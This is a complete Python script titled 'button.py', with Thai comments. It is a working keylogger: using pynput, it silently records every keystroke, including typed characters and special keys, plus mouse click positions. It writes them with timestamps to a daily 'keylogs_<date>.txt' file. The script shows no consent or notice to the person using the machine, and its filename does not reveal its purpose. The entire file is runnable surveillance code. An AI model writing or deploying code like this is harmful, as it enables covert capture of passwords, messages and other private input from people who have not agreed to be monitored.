# ไฟล์ button.py


from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
import logging
import datetime
import os

# กำหนดไดเรกทอรีที่บันทึกไฟล์
log_dir = ""  # สามารถกำหนดเป็นไดเรกทอรีที่ต้องการ หรือเว้นว่างไว้เพื่อบันทึกในไดเรกทอรีปัจจุบัน

# กำหนดรูปแบบไฟล์ล็อกที่มีชื่อแตกต่างกันในแต่ละวัน
log_filename = f"{log_dir}keylogs_{datetime.datetime.now().date()}.txt"

# กำหนดการตั้งค่าการบันทึกข้อมูล
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# ฟังก์ชันที่ใช้บันทึกการกดปุ่ม
def on_press(key):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        # ถ้ากดปุ่มตัวอักษร หรือ ตัวเลข
        message = f"ผู้ใช้กดปุ่ม '{key.char}' เวลา {timestamp}"
        logging.info(message)
    except AttributeError:
        # ถ้ากดปุ่มพิเศษ
        if key == Key.space:
            message = f"ผู้ใช้กดปุ่ม 'Space' เวลา {timestamp}"
        elif key == Key.enter:
            message = f"ผู้ใช้กดปุ่ม 'Enter' เวลา {timestamp}"
        elif key == Key.shift:
            message = f"ผู้ใช้กดปุ่ม 'Shift' เวลา {timestamp}"
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            message = f"ผู้ใช้กดปุ่ม 'Ctrl' เวลา {timestamp}"
        elif key == Key.alt_l or key == Key.alt_r:
            message = f"ผู้ใช้กดปุ่ม 'Alt' เวลา {timestamp}"
        elif key == Key.esc:
            message = f"ผู้ใช้กดปุ่ม 'Esc' เวลา {timestamp}"
        else:
            message = f"ผู้ใช้กดปุ่มพิเศษ: {key} เวลา {timestamp}"

        logging.info(message)

# ฟังก์ชันที่ใช้บันทึกการคลิกเมาส์
def on_click(x, y, button, pressed):
    if pressed:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message = f"ผู้ใช้คลิกที่ตำแหน่ง ({x}, {y}) ด้วยปุ่ม {button} เวลา {timestamp}"
        logging.info(message)

# เริ่มทำงาน
if __name__ == "__main__":
    with Listener(on_press=on_press) as keyboard_listener, MouseListener(on_click=on_click) as mouse_listener:
        keyboard_listener.join()
        mouse_listener.join()



